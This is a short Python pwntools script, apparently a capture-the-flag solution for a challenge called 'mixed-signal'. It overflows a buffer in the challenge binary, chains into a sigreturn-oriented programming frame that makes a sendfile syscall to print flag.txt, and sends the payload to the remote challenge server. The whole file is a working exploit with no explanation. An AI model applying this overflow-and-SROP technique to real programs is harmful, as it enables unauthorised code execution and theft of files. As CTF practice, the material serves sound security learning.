from pwn import p64, remote, process, ELF, context, SigreturnFrame

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('mixed-signal.chals.nitectf2024.live', 1337, ssl=True)

    else:
        context.binary = binary = ELF('./chal', checksec=False)
        r = process()

    vuln_addr = 0x4011eb
    gift_addr = 0x401196
    syscall_addr = 0x40119a
    ret_addr = 0x401016
    context.clear(arch='amd64')

    frame = SigreturnFrame()
    frame.rax = 0x28             # sendfile()
    frame.rdi = 0x1              # fd of output
    frame.rsi = 0x5              # fd of flag.txt
    frame.rdx = 0x0              # Offset
    frame.r10 = 0x50             # size of copied bytes
    frame.rip = syscall_addr
    # Syscall()

    payload = b'A'*16
    # payload += p64(ret_addr)
    payload += p64(vuln_addr) 
    payload += p64(syscall_addr)
    payload += bytes(frame)

    r.recvuntil('pickup!')
    r.sendline(payload)

    # Call rt_sigreturn 0xf
    r.sendline(b'A'*14)
    r.interactive()

exploit(True)